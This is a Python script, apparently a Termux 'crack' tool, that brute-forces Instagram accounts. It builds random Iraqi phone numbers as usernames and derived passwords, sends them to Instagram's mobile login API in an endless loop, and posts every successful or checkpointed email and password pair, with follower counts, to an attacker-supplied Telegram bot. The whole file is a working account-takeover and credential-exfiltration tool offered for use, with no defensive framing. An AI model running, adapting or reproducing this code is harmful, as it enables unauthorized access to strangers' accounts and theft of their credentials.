#!/usr/bin/python3 -B
try:
	import  os , sys , random, requests , time , json , secrets,uuid
	import subprocess
	from bs4 import BeautifulSoup
	from colorama import Fore as fore
	from secrets import token_hex
	from uuid import uuid4
	from time import sleep 
except ImportError as e:
	sys.exit('[Error] ' + e + ' :-\\')
	
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"

Sidraa = """  

\033[1;97m:'\033[1;92mOOOOOO\033[1;97m::'\033[1;92mOOOO\033[1;97m:'\033[1;92mOOOOOOOO\033[1;97m::'\033[1;92mOOOOOOOO\033[1;97m:::::'\033[1;92mOO0\033[1;97m::::
\033[1;97m'\033[1;92mOO\033[1;92m... \033[1;92mOO\033[1;97m:. \033[1;92mOO\033[1;97m:: \033[1;92mOO\033[1;97m.... \033[1;92mOO\033[1;97m: \033[1;92mOO\033[1;97m.... \033[1;92mOO\033[1;97m:::'\033[1;92mOO OO\033[1;97m:::
\033[1;92m OO\033[1;97m:::..::: \033[1;92mOO\033[1;97m:: \033[1;92mOO\033[1;97m:::: \033[1;92mOO\033[1;97m: \033[1;92mOO\033[1;97m:::: \033[1;92mOO\033[1;97m::'\033[1;92mOO\033[1;97m:. \033[1;92mOO\033[1;97m::
\033[1;97m. \033[1;92mOOOOOO\033[1;97m::: \033[1;92mOO\033[1;97m::\033[1;92m OO\033[1;97m:::: \033[1;92mOO\033[1;97m: \033[1;92mOOOOOOOO\033[1;97m::'\033[1;92mOO\033[1;97m:::. \033[1;92mOO\033[1;97m:
\033[1;97m:..... \033[1;92mOO\033[1;97m:: \033[1;92mOO\033[1;97m::\033[1;92m OO\033[1;97m:::: \033[1;92mOO\033[1;97m: \033[1;92mOO\033[1;97m..\033[1;92m OO\033[1;97m::: \033[1;92mOOOOOOOO0\033[1;97m:
'\033[1;92mOO\033[1;97m::: \033[1;92mOO\033[1;97m::\033[1;92m OO\033[1;97m:: \033[1;92mOO\033[1;97m:::: \033[1;92mOO\033[1;97m: \033[1;92mOO\033[1;97m::.\033[1;92m OO\033[1;97m:: \033[1;92mOO\033[1;97m.... \033[1;92mOO\033[1;97m:
. \033[1;92mOOOOOO\033[1;97m\033[1;97m::'\033[1;92mOOOO\033[1;97m: \033[1;92mOOOOOOOO\033[1;97m:: \033[1;92mOO\033[1;97m:::. \033[1;92mOO\033[1;97m: \033[1;92mOO\033[1;97m:::: \033[1;92mOO\033[1;97m:
\033[1;91m:......:::....::........:::..:::::..::..:::::..:: 
\033[1;97m--------------------------------------------------
\033[1;97m
 AUTHOR     : SIDRA ELEZZ
 Telegram   : TERMUX TOOLS
 YOUTUBE    : TERMUX TOOLS
 GITHUB     : GITHUB.COM/SIDRA ELEZZ
\033[1;37m
--------------------------------------------------"""  

                         
IRAQ ="""
         \033[1;97mOOOO    OOOOOOOO      OOOOOO0  
         \033[1;97m OO     OO     OO    OO     OO 
         \033[1;97m OO     OO     OO    OO     OO 
         \033[1;97m OO     OOOOOOOO     OO     OO 
         \033[1;97m OO     OO   OO      OO  OO OO 
         \033[1;97m OO     OO    OO     OO    OO  
         \033[1;97mOOOO    OO     OO     OOOO0 OO 

            \033[1;92m   CRACK FROM IRAQ
\033[1;97m--------------------------------------------------
\033[1;97m
 AUTHOR     : SIDRA ELEZZ
 Telegram   : TERMUX TOOLS
 YOUTUBE    : TERMUX TOOLS
 GITHUB     : GITHUB.COM/SIDRA ELEZZ
\033[1;37m
--------------------------------------------------\n                                    
"""
#------------------------------------------------------------------------------------------------------------------------
def psb(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
def login():
	re = requests.get("https://pastebin.com/raw/EW2JedW4")
	print (Sidraa)
	print ("\033[1;92mFIRST STEP OF LOGIN")
	print ("\033[1;97m--------------------")
	print ("\033[1;97m ") 
	password = input('          \033[1;93mTOOL PASSWORD: '+C)
	print (E)
	if password == "" :
	  sys.exit()
	if password in str(re.text):
	  print(H+" FIRST STEP Is Done. Logged in Successfully as ")
	  print ("\033[1;93m ")
	  print("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
	else:
	  print (" Wrong Password !")
	  os.system('xdg-open https://t.me/TT_RQ/1')
	  sys.exit()
	os.system('clear')
#------------------------------------------------------------------------------------------------------------------------0
def SidraELEzz(username,pas):
	global token , ID , Email 
	
	content = requests.get('https://www.instagram.com/' + username,headers = {'User-agent': 'your bot 0.1'}).text
	source = BeautifulSoup(content, 'html.parser')
	description = source.find("meta", {"property": "og:description"}).get("content")
	info_list = description.split("-")[0]
	followers = info_list[0:info_list.index("Followers")]
	info_list = info_list.replace(followers + "Followers, ", "")
	following = info_list[0:info_list.index("Following")]
	info_list = info_list.replace(following + "Following, ", "")
	posts = info_list[0:info_list.index("Posts")]
	
	time.sleep(1)
	requests.post("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+ID+"&text=⁦⌯  Hi Sidra Successful 💯 ⌯\n — — — — —  — — — — — . \n.✥. E𝗆𝖺𝗂𝗅  :"+ Email+"\n.✥. Pass  : "+ pas+"\n.✥. User  : "+username+"\n.✥. Follwers : "+followers+"\n.✥. Foolowing : "+following+"\n.✥. Post : "+posts+"\n⌯"+tt+"\n. — — — — —  — — — — —\n• Tele : @SidraTools .")
#------------------------------------------------------------------------------------------------------------------------0



def main():
	login()
	os.system('clear')
	new = "0987654321"
	tt=time.asctime()
	r = requests.session()
	global IRAQ , token , ID , Email , start_msg , id_msg , Ok , Cp , Sk , pas , username
	print(IRAQ)
	token = input(A+"["+C+"*"+A+"]"+H+ " TOKEN BOT :\n"+C)
	ID = input(A+"["+C+"*"+A+"]"+H+ " ID TELE :\n"+C)
	start_msg = r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=START HACK...🔥").json()
	id_msg	=(start_msg['result']["message_id"])
	print(E)
	os.system('clear')
	print(IRAQ)
	psb(E+"Choose the number , ok Example:"+L+"\n75 , 77 , 78 ")
	x = input(A+"["+C+"*"+A+"]"+H+ " Choose the number :"+C)
	print(C)
	print("-"*50)
	
	
	Ok = 0
	Cp = 0
	Sk = 0
	
	
	
	while True:
		user = str(''.join((random.choice(new) for i in range(8))))
		q = '+964'
		Email = q+x+user
		pas = "0"+x+user
		url='https://b.i.instagram.com/api/v1/accounts/login/'
		headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive'
}
		
		uid = uuid.uuid4()
		payload = { 
        'uuid': uid,
		'password': pas,
		'username': Email,
		'device_id': uid,
	    'from_reg': 'false',
	    '_csrftoken': 'missing',
		'login_attempt_countn': '0'}
		req = r.post(url,headers=headers,data=payload)
		if 'logged_in_user' in req.json():
			Ok+=1
			username =req.json()['logged_in_user']['username']
			SidraELEzz(username,pas)
		
		elif '"message":"challenge_required","challenge"' in req.json():
			Cp+=1
			r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi Sidra Checkpoint 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @SidraTools .")
		else:
			Sk+=1
			r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome Sidra ELEzz 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @SidraTools")
			